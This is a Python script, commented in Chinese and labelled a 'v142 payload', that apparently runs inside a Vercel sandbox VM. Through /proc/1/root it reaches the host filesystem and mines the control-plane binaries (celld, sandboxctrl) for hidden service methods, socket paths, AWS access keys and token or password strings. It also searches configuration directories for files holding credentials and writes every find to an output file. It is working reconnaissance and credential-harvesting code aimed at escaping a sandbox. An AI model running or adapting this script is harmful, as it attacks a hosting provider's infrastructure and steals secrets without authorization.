# -*- coding: utf-8 -*-
"""v142 payload: cell VM 二进制字符串挖掘 - celld/sandboxctrl/containerd 的服务路径/协议/凭据
目标: 找 APM socket 真实服务名 + cell API 隐藏方法 + 控制面协议信息
输出 /vercel/sandbox/v142c.out"""
import socket, struct, time, json, os, signal, re

OUT = '/vercel/sandbox/v142c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(290)

R = '/proc/1/root'


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rd(p, n=100000):
    try:
        d = open(p, 'rb').read(n)
        return d if isinstance(d, bytes) else str(d).encode()
    except Exception as e:
        return str(e).encode()


STR_RE = re.compile(rb'[\x20-\x7e\t\r\n]{6,}')


def strings(data, minlen=6):
    """提取可打印字符串 (C 级正则, 快)"""
    return [m.group().decode(errors='replace') for m in STR_RE.finditer(data)]


# 1: 找二进制位置
log('=== 1 find bins ===')
bins = []
for p in ['/opt/vercel/celld', '/usr/local/bin/celld', '/usr/bin/celld',
          '/opt/vercel/sandboxctrl', '/usr/local/bin/sandboxctrl', '/usr/bin/sandboxctrl',
          '/usr/bin/containerd', '/usr/local/bin/containerd', '/usr/bin/sandbox-init',
          '/opt/vercel/sandbox-init']:
    if os.path.exists(R + p):
        sz = os.path.getsize(R + p)
        bins.append((p, sz))
        log('BIN %s (%d bytes)' % (p, sz))
# 从 /proc/1/exe 和 /proc/536/exe 直接找
for pid in [1, 536, 490, 580]:
    try:
        exe = os.readlink('/proc/%d/exe' % pid)
        log('PID %d exe -> %s' % (pid, exe))
        if exe not in [b[0] for b in bins]:
            sz = os.path.getsize(exe)
            bins.append((exe, sz))
    except Exception as e:
        log('PID %d exe EXC %s' % (pid, e))

# 2: 每个二进制提取服务路径/关键字符串
log('=== 2 string mine ===')
pat_paths = re.compile(rb'/(?:vercel|hive|cell|apm|metrics|v1)[A-Za-z0-9_.\-/]*')
pat_svc = re.compile(rb'[A-Za-z0-9_.]+\.(?:v1|V1)\.[A-Za-z0-9_.]+')
pat_ak = re.compile(rb'AKIA[0-9A-Z]{16}')
pat_tok = re.compile(rb'(?:token|secret|key|password|authorization)[=: ]+[A-Za-z0-9_\-./+]{12,}')
pat_sock = re.compile(rb'/run/[A-Za-z0-9_\-./]+\.sock')

# 只挖自定义二进制 (containerd 是开源, 无私有协议)
bins = [b for b in bins if not b[0].endswith('containerd')][:4]
for bp, sz in bins:
    log('=== mine %s ===' % bp)
    try:
        data = open(R + bp, 'rb').read() if sz < 80 * 1024 * 1024 else open(R + bp, 'rb').read(80 * 1024 * 1024)
        log('read %d bytes' % len(data))
    except Exception as e:
        log('read EXC %s' % e)
        continue
    # 服务路径 (Connect/gRPC)
    hits = set()
    for m in pat_svc.finditer(data):
        s = m.group().decode(errors='replace')
        if 'containerd' not in s and 'google' not in s and 'grpc' not in s.lower():
            hits.add(s)
    svcs = sorted(hits)
    log('services (%d): %s' % (len(svcs), svcs[:80]))
    # socket 路径
    socks = set(m.group().decode(errors='replace') for m in pat_sock.finditer(data))
    log('socks: %s' % sorted(socks))
    # AKIA
    aks = set(m.group().decode() for m in pat_ak.finditer(data))
    if aks:
        log('AKIA FOUND: %s' % aks)
    # token 模式
    toks = set(m.group().decode(errors='replace')[:80] for m in pat_tok.finditer(data))
    if toks:
        log('tok hits: %s' % list(toks)[:10])
    # 含 apm/metrics 的路径 (直接正则, 不生成全量字符串)
    am = set(m.group().decode(errors='replace') for m in
             re.finditer(rb'[A-Za-z0-9_./\-]{0,60}(?:apm|metric)[A-Za-z0-9_./\-]{0,60}', data, re.I))
    log('apm/metrics strs (%d): %s' % (len(am), list(am)[:40]))
    # 含 cell 的路径
    cm = set(m.group().decode(errors='replace') for m in
             re.finditer(rb'[A-Za-z0-9_./\-]{0,60}cell[A-Za-z0-9_./\-]{0,60}', data, re.I))
    log('cell strs (%d): %s' % (len(cm), list(cm)[:40]))

# 3: 配置目录侦察
log('=== 3 config dirs ===')
for p in ['/etc/vercel', '/opt/vercel', '/etc/cell', '/run/cell', '/var/lib/vercel',
          '/etc/default', '/etc/systemd/system', '/etc/init.d', '/usr/lib/systemd/system']:
    if os.path.isdir(R + p):
        log('DIR %s: %s' % (p, sorted(os.listdir(R + p))[:40]))
        for fn in os.listdir(R + p)[:20]:
            fp = R + p + '/' + fn
            if os.path.isfile(fp) and os.path.getsize(fp) < 200000:
                try:
                    c = open(fp, 'rb').read(2000)
                    if any(k in c.lower() for k in (b'token', b'secret', b'key', b'auth', b'password', b'endpoint', b'23456')):
                        log('CFG %s: %r' % (fp, c[:800]))
                except Exception:
                    pass

log('V142_DONE')
f.close()
